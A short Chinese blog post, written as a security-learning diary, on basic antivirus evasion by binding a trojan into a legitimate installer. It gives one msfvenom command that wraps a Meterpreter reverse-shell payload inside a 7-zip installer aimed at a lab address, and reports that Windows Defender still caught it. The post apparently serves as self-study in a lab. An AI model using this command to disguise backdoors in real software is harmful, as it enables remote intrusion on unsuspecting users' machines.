---
title: 网络安全学习日记3：最基础的绕过杀毒软件的方法
date: 2026-07-31
updated: 2026-07-31
categories: 网络安全
tags:
  - 网络安全
  - 捆绑木马
  - 套壳
---

其实大多都已经失效了。

<!-- more -->

## 捆绑木马

这玩意是是最基础的防杀方式，也是最没用的（bushi

打开kali，这里有一个很可爱的 7-zip 安装程序，

![](https://image.smallaw.cc.cd//img1/cp3-1z.png)

```sh
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.198.130 lport=11451 -f exe -x 7z2602-x64.exe -o 7zmiao.exe

```

这样我们就得到了一个 7zmiao.exe 的可执行文件，在目标机子上运行，结果还是被 windows defender 杀掉了（。
